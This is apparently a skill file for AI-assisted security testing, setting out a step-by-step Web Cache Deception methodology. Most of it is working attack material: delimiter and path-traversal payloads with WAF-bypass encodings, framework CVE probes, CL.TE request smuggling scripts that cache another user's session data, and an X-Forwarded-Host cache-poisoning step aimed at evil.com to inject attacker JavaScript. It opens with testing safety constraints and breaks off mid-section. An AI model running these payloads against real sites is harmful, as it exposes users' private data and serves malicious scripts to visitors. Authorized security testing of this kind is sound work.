---
name: web-cache-deception
description: Comprehensive methodology for detecting, exploiting, and reporting Web Cache Deception vulnerabilities across all CDN providers, server frameworks, and attack families, including verification protocols, bypass trees, and advanced chaining techniques.
sources: hackerone_public, portswigger, bug_bounty_reports, cdn_documentation
---

# Web Cache Deception Testing

## Overview

Web Cache Deception (WCD) occurs when a CDN or reverse-proxy cache stores a response that contains user-specific private data, making that data available to any attacker who requests the same cached URL without authentication. The root cause is a discrepancy between how the CDN parses and caches URLs versus how the origin server routes them.

**Core mechanism**: The attacker crafts a URL that the CDN caches (based on file extension or directory prefix) while the origin server ignores the crafted suffix and serves the authenticated user's private data. The cached response is then served to the attacker without credentials.

**Safety constraints for all testing:**
- Never cause a real user to visit a deception URL (do not send emails, DMs, or embed lure links)
- Prime the cache only with an operator-controlled test account containing synthetic canary data
- Do not target endpoints containing real tokens, payment data, medical data, private files, or other users' PII
- Stop after controlled cross-session disclosure is proven; do not replay tokens or expand to account takeover unless separately authorized
- If two controlled identities, safe canary data, or cleanup/TTL information are unavailable, do not perform live deception testing

---

## Phase 0: Reconnaissance and Fingerprinting

### CDN Identification

```bash
curl -sI https://TARGET/ | grep -iE "server|x-cache|cf-ray|cf-cache|x-amz|x-served-by|x-akamai|via|x-cdn|x-fastly"
```

**CDN Signature Headers:**

| CDN | Identifying Headers |
|-----|-------------------|
| Cloudflare | `CF-Ray`, `CF-Cache-Status`, `Server: cloudflare` |
| Akamai | `X-Akamai-*`, `Server: AkamaiGHost`, `X-Cache-Key` (with Pragma debug) |
| Fastly | `X-Served-By: cache-*`, `X-Cache-Hits`, `Via: ... varnish` |
| CloudFront | `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`, `X-Cache: Hit/Miss from cloudfront` |
| Azure CDN | `X-MSEdge-Ref`, `X-Azure-*` |
| Google Cloud CDN | `Via: ... google`, `X-Goog-*` |
| Nginx proxy_cache | `X-Cache-Status`, `X-Proxy-Cache` |
| Varnish | `X-Varnish`, `Via: ... varnish`, `Age` |

**Akamai debug headers:**
```bash
curl -sI -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key" https://TARGET/
```

### CDN Normalization Camp Classification (Critical)

This determines which attack direction is viable.

**Non-Normalizing CDNs** (do NOT decode/resolve before cache rules):
- Cloudflare, Akamai (default), Fastly, Google Cloud CDN, Nginx proxy_cache, Varnish
- Directory traversal payloads (Family 3A) work: CDN caches `/static/..%2faccount` as a `/static/` prefix hit while origin resolves to `/account`

**Normalizing CDNs** (decode and resolve BEFORE applying cache rules):
- CloudFront, Azure CDN, Imperva
- Family 3A does NOT work; Direction 2 (Family 4A) works if origin has delimiter truncation

```bash
# Confirm normalization behavior
curl -sI "https://TARGET/static/..%2fstatic/known-file.css"
# Response matches /static/known-file.css → CDN normalizes
# 404 or different response → CDN does NOT normalize
```

### Framework Detection

```bash
# Spring/Java
curl -s https://TARGET/nonexistent-path-12345 | grep -i "whitelabel"
curl -sI https://TARGET/ | grep -i "jsessionid"
curl -sI https://TARGET/;test  # semicolon handling

# Rails
curl -s https://TARGET/ | grep -i "csrf-token\|authenticity_token\|turbolinks"
curl -sI "https://TARGET/test-page.json"  # dot format suffix

# Next.js
curl -s https://TARGET/ | grep -i "__NEXT_DATA__"
curl -s https://TARGET/ | grep -oP '"buildId":"[^"]*"'
curl -sI https://TARGET/_next/static/

# SvelteKit
curl -s https://TARGET/__data.json

# Nuxt
curl -s https://TARGET/_payload.json
curl -s https://TARGET/ | grep -i "__NUXT_DATA__"

# Django
curl -s https://TARGET/ | grep -i "csrfmiddlewaretoken"

# Express
curl -sI https://TARGET/ | grep -i "x-powered-by: Express"

# PHP
curl -sI https://TARGET/ | grep -i "x-powered-by: PHP"

# ASP.NET/IIS
curl -sI https://TARGET/ | grep -iE "x-powered-by.*asp|x-aspnet|set-cookie.*asp.net_sessionid"
```

---

## Phase 1: Cache Rule Mapping

### Extension-Based Cache Rule Discovery

**Cloudflare default cached extensions (56 total):**
```
.7z .avif .bin .bmp .bz2 .class .css .csv .doc .docx .ejs .eot .eps
.exe .flac .gif .gz .ico .jar .jpeg .jpg .js .mid .midi .mkv .mp3
.mp4 .ogg .otf .pdf .pict .pls .png .ppt .pptx .ps .rar .svg .svgz
.swf .tar .tif .tiff .ttf .webm .webp .woff .woff2 .xls .xlsx .zip
```

```bash
ID=$(openssl rand -hex 4)
for ext in css js png jpg gif ico svg woff2 avif map webmanifest json txt xml pdf; do
  echo "=== Testing .${ext} ==="
  curl -sI "https://TARGET/cache-test-${ID}.${ext}" | grep -iE "x-cache|cf-cache|age"
  sleep 0.5
  curl -sI "https://TARGET/cache-test-${ID}.${ext}" | grep -iE "x-cache|cf-cache|age"
done
```

### Directory-Based Cache Rule Discovery

```bash
ID=$(openssl rand -hex 4)
for dir in static assets public media images css js fonts uploads wp-content wp-includes _next/static build dist bundles resources _app/immutable; do
  echo "=== Testing /${dir}/ ==="
  curl -sI "https://TARGET/${dir}/test-${ID}.css" | grep -iE "x-cache|cf-cache|age|cache-control"
done
```

### Query String Cache Key Analysis

| CDN | Default | WCD Risk |
|-----|---------|-----------|
| Cloudflare | Includes all query strings | Low |
| Akamai | Configurable (default: include all) | Low |
| CloudFront | **Excludes all** (CachingOptimized policy) | **HIGH** |
| Fastly | Includes all | Low |
| Azure CDN | Configurable | Depends |
| Google Cloud CDN | Includes all | Low |

```bash
# Test if query string is in cache key
ID1=$(openssl rand -hex 4); ID2=$(openssl rand -hex 4)
curl -sI "https://TARGET/known-static.css?param=value-a-${ID1}" | grep -iE "x-cache|cf-cache"
curl -sI "https://TARGET/known-static.css?param=value-b-${ID2}" | grep -iE "x-cache|cf-cache"
# Second is HIT after first was MISS → query NOT in cache key
```

### Cache Deception Armor (CDA) Check (Cloudflare)

```bash
curl -sI "https://TARGET/known-dynamic-page.css" | grep -i "cf-cache-status"
# CF-Cache-Status: BYPASS → CDA active
# CF-Cache-Status: MISS/HIT → CDA not active or not triggered
```

**CDA Known Gaps:**
- `.avif` bypass reported (HackerOne #1391635)
- `.js` returning `application/json` Content-Type may not trigger CDA
- CDA is OFF by default
- CDA does NOT protect against directory-based attacks (Families 3/4)

---

## Phase 2: Delimiter Differential Testing

A delimiter differential exists when the origin truncates a URL at a character but the cache does not. This is the core mechanism enabling most WCD attacks.

**Baseline method:**
```bash
BASELINE=$(curl -s -H "Cookie: session=YOUR_SESSION" "https://TARGET/ENDPOINT" | md5sum | cut -d' ' -f1)
# Append delimiter+garbage, compare md5 to baseline
# MATCH = origin truncates at that delimiter
```

### Delimiter Reference Matrix

| Delimiter | Raw | Encoded | Frameworks That Truncate | Cache Treatment |
|-----------|-----|---------|------------------------|----------------|
| Semicolon | `;` | `%3B` | Spring, Tomcat, Jetty, WildFly | Part of path (all CDNs) |
| Dot | `.` | `%2E` | Rails (format suffix) | Part of path (all CDNs) |
| Hash | `#` | `%23` | Some Nginx configs | Part of path (all CDNs) |
| Question mark | `?` | `%3F` | Apache, IIS, Tomcat | Varies by CDN |
| Null byte | N/A | `%00` | OpenLiteSpeed, PHP < 5.3.4 | Part of path (all CDNs) |
| Newline | N/A | `%0A` | Nginx (prefix rewrite only) | Part of path (all CDNs) |
| Forward slash | `/` | `%2F` | Path traversal when decoded | Not decoded (most CDNs) |
| Backslash | `\` | `%5C` | IIS (treats as `/`) | Not converted (all CDNs) |

**Semicolon (Spring/Java) — most reliable:**
```bash
# Spring MVC/Tomcat treats ; as matrix variable delimiter; strips it for routing
curl -s -H "Cookie: session=YOUR_SESSION" "https://TARGET/ENDPOINT;testparam" | md5sum
# Match baseline → semicolon differential confirmed
```

Spring version behavior:
- Spring 4.x/5.x/Boot 2.x: semicolons stripped by default
- Spring Boot 3.x/PathPatternParser: semicolons still stripped from routing path

**Dot (Rails format suffix):**
```bash
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/ENDPOINT.css" | md5sum
# Match baseline AND Content-Type is text/html → Rails format differential
# SKIP .json — if Rails returns JSON for /account.json, that is content negotiation, NOT WCD
```

**Backslash (IIS — universal differential):**
```bash
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/ENDPOINT%5Ctestparam" | md5sum
# IIS treats \ as /, NO CDN does. Universal differential for IIS behind any CDN.
```

**Complete delimiter test script:**
```bash
#!/bin/bash
TARGET="https://TARGET"; ENDPOINT="/account"; COOKIE="session=ACCOUNT_A_SESSION"
BASELINE=$(curl -s -H "Cookie: $COOKIE" "${TARGET}${ENDPOINT}" | md5sum | cut -d' ' -f1)
echo "Baseline: $BASELINE"

for name in "semicolon:;" "enc_semi:%3B" "enc_hash:%23" "null:%00" "newline:%0A" "backslash:%5C" "enc_qmark:%3F" "dbl_enc:%253B"; do
  DELIM=$(echo "$name" | cut -d: -f2)
  RESULT=$(curl -s -H "Cookie: $COOKIE" "${TARGET}${ENDPOINT}${DELIM}testparam" | md5sum | cut -d' ' -f1)
  [ "$RESULT" == "$BASELINE" ] && echo "${name}: MATCH - DIFFERENTIAL EXISTS" || echo "${name}: NO MATCH"
done
```

---

## Phase 3: Path Normalization Testing

### Direction 1: Origin Normalizes, Cache Does NOT (Most Common)

**Applicable:** Non-normalizing CDNs (Cloudflare, Akamai, Fastly, GCP, Nginx, Varnish) + origin that decodes %2f and resolves dot-segments (Nginx, Apache, IIS, Tomcat).

```bash
# Test: origin decodes %2f and resolves ..
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/anypath/..%2fENDPOINT" | md5sum
# Match baseline → Direction 1 viable

# Attack payload:
# /static/..%2faccount → CDN sees /static/ (caches), origin resolves to /account
```

### Direction 2: Cache Normalizes, Origin Does NOT

**Applicable:** Normalizing CDNs (CloudFront, Azure CDN, Imperva) + origin that does NOT decode %2f (Express.js, Next.js, Flask, FastAPI) + delimiter truncation on origin.

```bash
# Attack payload:
# /account;%2f%2e%2e%2fstatic/any
# CloudFront: decodes %2f%2e%2e%2f → /../, resolves → /static/any (caches)
# Origin (Spring): truncates at ; → routes to /account (serves private data)
```

### Traversal Depth Calculation

| Cached Prefix | Depth from Root | Required Traversal |
|--------------|----------------|-------------------|
| `/static/` | 1 | `..%2f` |
| `/assets/` | 1 | `..%2f` |
| `/_next/static/` | 2 | `..%2f..%2f` |
| `/wp-content/uploads/` | 3 | `..%2f..%2f..%2f` |
| `/sites/default/files/` | 3 | `..%2f..%2f..%2f` |

### Encoding Variants for WAF Bypass

```
..%2f          → standard
%2e%2e%2f      → fully encoded dot-dot-slash
..%2F          → uppercase hex
..%252f        → double-encoded (WAF bypass)
%c0%af         → overlong UTF-8 slash (some legacy servers)
..%5c          → backslash (IIS only)
```

---

## Phase 4: Payload Construction

### Family 1A: Delimiter + Static Extension Suffix

**Pattern:** `/<sensitive-endpoint><DELIMITER><random>.<cached-extension>`

```bash
WCD_ID=$(openssl rand -hex 8)

# Semicolon (Spring/Tomcat/Jetty)
/account;${WCD_ID}.css
/account;jsessionid=${WCD_ID}.css

# Dot (Rails format suffix)
/account.css
/account.ico
/account.avif
# Skip .json — may trigger content negotiation

# Encoded hash
/account%23${WCD_ID}.css

# Null byte (OpenLiteSpeed)
/account%00${WCD_ID}.css

# Backslash (IIS)
/account%5C${WCD_ID}.css
```

**Extension priority order:**
1. `.css` — universally cached, clear WCD indicator
2. `.js` — cached (CDA may pass if Content-Type is application/json)
3. `.ico` — universally cached, rarely served by dynamic endpoints
4. `.avif` — CDA bypass reported (HackerOne #1391635)
5. `.woff2` — cached, uncommon in WAF rules
6. `.map` — source map, often overlooked
7. `.webmanifest` — PWA manifest, often cached
8. `.svg`, `.png`, `.jpg`, `.gif` — widely cached

### Family 1B: Path Confusion (No Delimiter)

**Pattern:** `/<sensitive-endpoint>/<random>.<cached-extension>`

Applicable when origin ignores trailing path segments (Next.js catch-all routes, Express wildcards, PHP PATH_INFO, Django `re_path` with `.*`).

```bash
/account/${WCD_ID}.css
/account/sub/${WCD_ID}.css
/account/static/${WCD_ID}.css
```

### Family 3A: Directory Traversal — Direction 1

**Pattern:** `/<cached-dir>/..%2f<sensitive-endpoint>`

```bash
# Single depth
/static/..%2faccount
/assets/..%2faccount

# Double depth
/_next/static/..%2f..%2faccount

# Triple depth
/wp-content/uploads/..%2f..%2f..%2faccount

# Combined with extension for double cache rule match
/static/..%2faccount;${WCD_ID}.css

# WAF bypass variants
/static/%2e%2e%2faccount        # fully encoded
/static/..%252faccount          # double encoded
/static/..%5caccount            # backslash (IIS)
```

**Cloudflare CDA bypass:** Directory-based attacks are NOT blocked by CDA. If `/account;wcd.css` returns `CF-Cache-Status: BYPASS`, use `/static/..%2faccount` instead.

### Family 4A: Directory Traversal — Direction 2

**Pattern:** `/<sensitive-endpoint><DELIMITER>%2f%2e%2e%2f<cached-dir>/any`

```bash
# CloudFront/Azure CDN + Spring origin
/account;%2f%2e%2e%2fstatic/any.css
# CloudFront decodes → /static/any.css (caches); origin truncates at ; → /account

# Depth from endpoint to static dir matters
# /api/v1/user (depth 3) → /static/ (depth 1):
/api/v1/user;%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fstatic/any.css
```

### Family 5A: File-Name-Based Cache Rules

```bash
# Commonly cached file names
/account;${WCD_ID}/robots.txt
/account/${WCD_ID}/robots.txt
/account%23${WCD_ID}/favicon.ico
```

### Family 7A: Query String Exclusion (CloudFront)

CloudFront's `CachingOptimized` policy excludes ALL query strings by default. `/account;wcd.css?r=attacker_random` and `/account;wcd.css` share the same cache key.

```bash
# Test for exclusion
ID1=$(openssl rand -hex 4); ID2=$(openssl rand -hex 4)
curl -sI "https://TARGET/test.css?q=${ID1}" > /dev/null
curl -sI "https://TARGET/test.css?q=${ID2}" | grep -iE "x-cache|cf-cache"
# HIT → query excluded from cache key
```

### Family 8A: GraphQL GET Endpoint

```bash
# If CDN excludes query from cache key AND GraphQL supports GET:
QUERY='query{viewer{id,email,name,phone}}'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$QUERY'))")
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/graphql?query=${ENCODED}"
# Cache key = /graphql (no query); authenticated response cached for all
```

### Family 9A: Next.js Data Routes

```bash
# Extract buildId
BUILD_ID=$(curl -s "https://TARGET/" | grep -oP '"buildId":"([^"]*)"' | head -1 | cut -d'"' -f4)

# Data routes (/_next/ is commonly cached)
/_next/data/${BUILD_ID}/account.json
/_next/data/${BUILD_ID}/profile.json
/_next/data/${BUILD_ID}/dashboard.json
/_next/data/${BUILD_ID}/settings.json
```

### Family 9B: SvelteKit Data Routes

```bash
/account/__data.json
/profile/__data.json
/settings/__data.json
```

### Family 9C: Nuxt Payload Routes

```bash
/account/_payload.json
/profile/_payload.json
/settings/_payload.json
```

---

## Phase 5: Framework-Specific Attacks

### Next.js

**Attack 1: __NEXT_DATA__ Cache Deception**

Every Pages Router page embeds ALL `getServerSideProps` data in `<script id="__NEXT_DATA__">`. Caching the HTML via WCD exposes the full user object, CSRF tokens, and session data.

**CVE-2025-29927 — Middleware Bypass (< 14.2.25 and < 15.2.3):**
```bash
# Bypass ALL middleware including auth and Cache-Control enforcement
curl -sI -H "x-middleware-subrequest: middleware" "https://TARGET/admin/dashboard"
# If 200 while normal returns 302/401 → middleware bypass active
# Without middleware: Cache-Control: no-store (not cached)
# With bypass: NO Cache-Control → CDN caches it

# Test other path values
for path in middleware src/middleware pages/_middleware app/middleware; do
  curl -sI -H "x-middleware-subrequest: ${path}" "https://TARGET/account" | head -3
done
# Multiple colons: middleware:middleware:middleware:middleware:middleware
```

**CVE-2024-46982 — Stale Elixir (>=13.5.1 <13.5.7 and >=14.0.0 <14.2.10):**
```bash
curl -sI -H "Cookie: session=ACCOUNT_A" "https://TARGET/account?__nextDataReq=1" -H "x-now-route-matches: 1"
# If Cache-Control: s-maxage=31536000, stale-while-revalidate → CDN caches for 1 year
```

**Avoid `.json`** extension on Next.js — it may trigger data route handler instead of WCD.

### Spring / Java (Tomcat, Jetty, WildFly)

**Semicolon matrix variable exploitation:**

```bash
# Verify truncation
curl -s -H "Cookie: session=ACCOUNT_A" "https://TARGET/account;anything" | md5sum
# Match baseline → confirmed

# Payloads
/account;${WCD_ID}.css
/account;jsessionid=${WCD_ID}.css
/account;color=red/${WCD_ID}.css

# Deeper paths
/api/user/profile;${WCD_ID}.css
/api/user;a/profile;${WCD_ID}.css

# Actuator endpoints (sensitive if exposed)
/actuator/env;${WCD_ID}.css
/actuator/configprops;${WCD_ID}.css
```

### Rails / Ruby

**Dot extension format suffix:**

```bash
# /account.css tells Rails "render /account in CSS format"
# No CSS template → falls back to HTML → serves full page
curl -sI -H "Cookie: _session_id=ACCOUNT_A" "https://TARGET/account.css" | grep "content-type"
# text/html despite .css URL → differential confirmed

# Extensions that trigger HTML fallback (safe to use)
for ext in css ico map webmanifest avif woff2 svg; do
  curl -sI -H "Cookie: _session_id=ACCOUNT_A" "https://TARGET/account.${ext}"
done
# NEVER use .json or .xml — Rails returns JSON/XML by design (FP-7)
```

**CVE-2025-61598 (Discourse):**
```bash
curl -sI -H "Cookie: _t=ACCOUNT_A" "https://DISCOURSE_TARGET/session/current;wcd.css"
```

### Django / Python

```bash
# APPEND_SLASH behavior check
curl -sI "https://TARGET/account" | head -5  # 301 → /account/ if APPEND_SLASH=True

# re_path() without $ anchor
/account/${WCD_ID}.css  # 200 if route is re_path(r'^account', view)

# Static/media traversal
/static/..%2faccount/
/media/..%2faccount/
```

### Express.js / Node.js

```bash
# Wildcard routes: app.get('/account/*', handler)
/account/${WCD_ID}.css

# Static middleware traversal
/static/..%2faccount

# Check for loose regex: app.get(/^\/account/, handler)
/account.css
```

### ASP.NET / IIS

```bash
# Backslash path confusion (universal IIS differential)
/account%5C${WCD_ID}.css
# IIS: \ treated as / → routes to /account
# CDN: sees /account%5Cxxx.css → caches based on extension

# X-Original-URL path override (Symfony, IIS URL Rewrite)
curl -sI -H "X-Original-URL: /api/user/profile" "https://TARGET/static/cacheable.css"
# Origin processes /api/user/profile; cache stores under /static/cacheable.css

# X-Rewrite-URL override
curl -sI -H "X-Rewrite-URL: /admin/users" "https://TARGET/images/banner.png"
```

### PHP

```bash
# PATH_INFO exploitation (AcceptPathInfo On)
/account.php/${WCD_ID}.css
# PHP: SCRIPT_NAME=/account.php, PATH_INFO=/xxx.css → serves account.php
# CDN: URL ends in .css → caches
```

### SvelteKit CVEs

```bash
# CVE-2025-67647 — missing Cache-Control on __data.json
curl -sI -H "Cookie: session=ACCOUNT_A" "https://TARGET/account/__data.json" | grep "cache-control"
# If absent → CDN may cache user-specific JSON

# CVE-2024-34049 — path traversal in static serving
curl -sI "https://TARGET/_app/immutable/..%2f..%2faccount"
```

---

## Phase 6: CDN Differential Matrix

### Full CDN × 11 Behaviors Matrix

| Behavior | Cloudflare | Akamai | Fastly | CloudFront | Azure CDN | GCP CDN | Nginx proxy_cache | Varnish |
|----------|-----------|--------|--------|------------|-----------|---------|------------------|---------|
| Normalizes dot-segments before cache rules | No | No | No | **Yes** | **Yes** | No | No | No |
| Decodes `%2F` before rules | No | No | No | **Yes** | **Yes** | No | No | No |
| Recognizes `;` as delimiter | No | No | No | No | No | No | No | No |
| Recognizes `.` as format delimiter | No | No | No | No | No | No | No | No |
| Converts `%5C` to `/` | No | No | No | No | No | No | No | No |
| Query string in cache key (default) | Yes | Config | Yes | **No** | Config | Yes | Yes | Yes |
| Cookie in cache key | No | Config | No | No | No | No | No | No |
| Cache Deception protection | CDA (off by default) | CT validation (config) | None | None | None | None | None | None |

### High-Confidence CDN + Framework Combinations

| CDN | Origin | Delimiter | Payload | Confidence |
|-----|--------|-----------|---------|------------|
| Cloudflare | Spring/Tomcat | `;` | `/account;wcd.css` | High |
| Cloudflare | Spring/Tomcat | `%3B` | `/account%3Bwcd.css` | High |
| Cloudflare | Rails | `.` | `/account.ico` | High |
| Cloudflare | OpenLiteSpeed | `%00` | `/account%00wcd.css` | High |
| Cloudflare | Nginx (rewrite) | `%0A` | `/users/account%0awcd.css` | Medium |
| Cloudflare | Any normalizing | `..%2f` | `/static/..%2faccount` | High |
| Akamai | Spring/Tomcat | `;` | `/account;wcd.js` | High |
| CloudFront | Spring + traversal | `;+%2f` | `/account;%2f%2e%2e%2fstatic/x` | High |
| Any CDN | IIS | `%5C` | `/static/..%5Caccount` | High |

---

## Phase 7: Two-Session Verification Protocol

**Never report a WCD finding without completing this protocol.**

### Step 1: Establish Canonical Baseline Controls

```bash
CANARY="WCD-CANARY-$(openssl rand -hex 8)"
# MANUALLY: Set Account A's display name or bio to this canary value

# Verify canary appears with authentication
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must find canary > 0

# Verify canary ABSENT without authentication
curl -s "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0 (redirected or 401/403)

# HARD STOP: If anonymous users see Account A's data at the CANONICAL URL, this is IDOR, NOT WCD.
```

### Step 2: Prime as Account A

```bash
WCD_ID=$(openssl rand -hex 4)
DECEPTION_URL="https://TARGET/ENDPOINT;wcd-${WCD_ID}.css"

curl -sS -D /tmp/wcd-prime-headers.txt \
  -H "Cookie: session=ACCOUNT_A_SESSION" \
  "$DECEPTION_URL" -o /tmp/wcd-prime-body.html

echo "Cache status: $(grep -iE 'x-cache|cf-cache' /tmp/wcd-prime-headers.txt)"
echo "Canary present: $(grep -c "$CANARY" /tmp/wcd-prime-body.html)"
# Expected: 200 OK, canary present, X-Cache: MISS

sleep 3
# Confirm cache storage (re-request with same session)
curl -sI -H "Cookie: session=ACCOUNT_A_SESSION" "$DECEPTION_URL" | grep -iE "x-cache|cf-cache|age"
# Expected: HIT or Age > 0
```

### Step 3: Probe Without Account A Credentials

```bash
# Verify probe session is completely isolated first
curl -sI "https://TARGET/ENDPOINT" | head -1
# Must be 401/403/302 (not 200)

curl -sS -D /tmp/wcd-probe-headers.txt "$DECEPTION_URL" -o /tmp/wcd-probe-body.html

echo "CANARY PRESENT: $(grep -c "$CANARY" /tmp/wcd-probe-body.html)"
echo "X-Cache: $(grep -iE 'x-cache|cf-cache' /tmp/wcd-probe-headers.txt)"
```

**If canary present + X-Cache HIT + body hash matches prime → WCD CONFIRMED (preliminary)**
**If canary present + X-Cache MISS → NOT WCD, this is IDOR/broken access control**

### Step 4: Negative Controls (ALL 5 Must Pass)

```bash
# 4.1: Unprimed URL — canary must be ABSENT
CTRL_ID=$(openssl rand -hex 4)
curl -s "https://TARGET/ENDPOINT;wcd-${CTRL_ID}.css" | grep -c "$CANARY"
# Must be 0 — if canary appears, this is broken access control, NOT WCD

# 4.2: Canonical URL still enforces auth
curl -s "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0

# 4.3: Account B sees no cross-contamination
curl -s -H "Cookie: session=ACCOUNT_B_SESSION" "https://TARGET/ENDPOINT" | grep -c "$CANARY"
# Must be 0

# 4.4: Non-cacheable variant does not leak
BUST_ID=$(openssl rand -hex 4)
curl -s -H "Cookie: session=ACCOUNT_A_SESSION" "https://TARGET/ENDPOINT?nocache=${BUST_ID}" -o /dev/null
curl -s "https://TARGET/ENDPOINT?nocache=${BUST_ID}" | grep -c "$CANARY"
# Must be 0 — isolates caching as the mechanism

# 4.5: Document edge node (scope verification)
curl -sS -D- "$DECEPTION_URL" | grep -iE "x-served-by|cf-ray|x-amz-cf-pop"
```

### Step 5: Second Independent Reproduction

Set a NEW canary value on Account A, generate a new WCD_ID, repeat Steps 2-4 fully.

**Minimum threshold:** 2 independent reproductions, each with unique canary and WCD_ID, all 5 negative controls passing.

### Step 6: Cleanup

```bash
# Cloudflare purge
curl -sS -X POST "https://api.cloudflare.com/client/v4/zones/ZONE_ID/purge_cache" \
  -H "Authorization: Bearer API_TOKEN" -H "Content-Type: application/json" \
  --data "{\"files\":[\"$DECEPTION_URL\"]}"

# CloudFront invalidation
aws cloudfront create-invalidation --distribution-id DIST_ID --paths "/ENDPOINT;wcd-*"

# Fastly purge
curl -sS -X POST "https://api.fastly.com/purge/$DECEPTION_URL" -H "Fastly-Key: API_KEY"

# Default TTLs when origin sets no Cache-Control:
# Cloudflare: depends on rules (2h-4h for Cache Everything)
# CloudFront: 24 hours
# Akamai: 1h-7d (property-dependent)
# Fastly: 3600s
# Varnish: 120s
```

---

## Phase 8: False Positive Elimination

Execute these in order. Stop at the first YES.

| FP | Description | Test | Fix |
|----|-------------|------|-----|
| FP-1 | Account A cookies still in probe | `curl -v "$DECEPTION_URL" 2>&1 \| grep -i "^> Cookie"` — must be empty | Use completely separate client/session |
| FP-2 | Browser/service worker cache | Check if `Size` column shows `(from disk cache)` | Use curl, different machine |
| FP-3 | Response contains no identity-specific data | `diff auth-response.html noauth-response.html` | Only report if data is user-specific AND private |
| FP-4 | Cache varies on Cookie/Authorization | Different session → `curl -sI -H "Cookie: session=DIFFERENT_VALUE" "$DECEPTION_URL" \| grep "x-cache"` — MISS means per-user keying | True negative |
| FP-5 | Error page cached (not sensitive data) | Check prime response status — must be 200 | Adjust payload |
| FP-6 | 301/302 redirect cached | `head -1 /tmp/prime-headers.txt` | Redirect, not data |
| FP-7 | Extension triggers content negotiation | Compare Content-Type of canonical vs suffixed URL | Use `.ico`, `.avif`, `.map` instead of `.json` |
| FP-8 | Canary data is publicly visible | `curl -s "https://TARGET/ENDPOINT" \| grep -c "$CANARY"` without auth | Use private fields: email, API key, internal ID |
| FP-9 | Cache key includes unguessable query | Test two different query values, both MISS | Downgrade to informational |
| FP-10 | Cache hit is per-PoP only | Compare `cf-ray`/`x-amz-cf-pop` between prime and probe | Still valid, note scope |
| FP-11 | Stale data from same user | Verify current canary (set THIS test) appears in probe | Use new canary each test |
| FP-12 | Personalization is region-based | Check `Vary: Accept-Language` or geolocation header | Confirm data is identity-specific |

---

## Phase 9: Bypass Decision Trees

### Tree 1: Extension Suffix Not Being Cached

1. Check `Cache-Control` on prime response — `no-store`/`private` present?
2. Test if CDN ignores `Cache-Control: no-store` (try with known static URL)
3. Check for CDA active (`CF-Cache-Status: BYPASS` on content-type mismatch)
4. Try CDA bypass extensions: `.avif`, `.woff2`, `.map`, `.ico`, `.webmanifest`
5. Try encoded delimiters: `%3B` instead of `;`, `%23`, `%3F`
6. Fall back to directory-based attacks (Tree 3) — CDA does NOT protect directory rules

**Extension fallback order when `.css` fails:**
`.ico` → `.avif` → `.woff2` → `.map` → `.webmanifest` → `.exe` → `.bin` → `.svg`

### Tree 2: Origin Rejects the Crafted URL (404/400)

- 404 → test if origin accepts extra path segments: `/account/anything` → 200 means path-append (1B) works
- 400 → avoid `%00`, `%0A` (control characters), use `;` or `%23`
- 301/302 → check if redirect itself is cached with sensitive location; follow to see final response

**Framework delimiter selection:**

| Framework | Primary | Secondary | Tertiary |
|-----------|---------|-----------|----------|
| Spring/Tomcat | `;` | `;jsessionid=x` | `%3B` |
| Rails | `.` | `.ico`, `.avif` | `%2E` |
| ASP.NET/IIS | `;` | `%5C` | `%00` (< Win 2008) |
| PHP | PATH_INFO `/` | `%00` (< 5.3.4) | — |
| Express.js | `.` | `/` (wildcards) | — |
| Django | `/` (re_path) | `.` | — |

### Tree 3: Directory Prefix Not Cached

```bash
# Discover all cached prefixes
for prefix in static assets public media images css js fonts uploads wp-content \
  wp-includes _next/static build dist bundles resources _app/immutable; do
  CACHE=$(curl -sI "https://TARGET/${prefix}/test.css" | grep -iE "cf-cache|x-cache" | head -1)
  echo "$CACHE" | grep -qi "hit\|miss" && echo "[CACHEABLE] /${prefix}/"
done
```

If nothing cached → WCD via path confusion is not feasible. Document negative finding.

---

## Phase 10: Advanced Attack Chains

### HTTP Request Smuggling + WCD

Standard WCD requires the victim to visit the crafted URL. Smuggling eliminates this requirement.

**CL.TE Detection:**
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGPOST' | \
  openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# GPOST/XGET/XPOST method in next response → desync confirmed
```

**CL.TE WCD Exploit:**
```bash
{
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 130\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /api/auth/session HTTP/1.1\r\nHost: TARGET\r\nCookie: session=ACCOUNT_A_SESSION\r\nContent-Length: 15\r\n\r\nx=1'
sleep 0.05
printf 'GET /static/app.js HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n'
} | openssl s_client -connect TARGET:443 -quiet 2>/dev/null
# Session data stored under /static/app.js cache key
curl -s "https://TARGET/static/app.js"  # retrieve from cache
```

**H2.CL Detection:**
```bash
curl -s -o /dev/null -w "%{http_version}" --http2 "https://TARGET/"
# "2" = HTTP/2 accepted; check Via header for H1 downgrade to origin
```

**Tools:** HTTP Request Smuggler (Burp Extension), Turbo Intruder, h2csmuggler, Python `h2` library

### Cache Poisoning Escalation Chains

**X-Original-URL / X-Rewrite-URL path override (direct WCD):**
```bash
# Origin processes the override path; cache keys on the actual URL
curl -s -H "X-Original-URL: /api/user/profile" \
  -H "Cookie: session=ACCOUNT_A_SESSION" \
  "https://TARGET/static/cacheable-page.css"
# Verify from clean session:
curl -s "https://TARGET/static/cacheable-page.css"  # returns profile data
```

**X-Forwarded-Host → Script Import Hijack (Stored XSS):**
```bash
# Check if unkeyed X-Forwarded-Host controls script imports
curl -s -H "X-Forwarded-Host: evil.com" "https://TARGET/" | grep 'src=".*evil.com'
# If reflected: poison the cache without cachebuster
curl -s -H "X-Forwarded-Host: evil.com" "https://TARGET/" -o /dev/null -D -
# Verify: clean session loads attacker's JS
```

**Fat GET detection:**
```bash
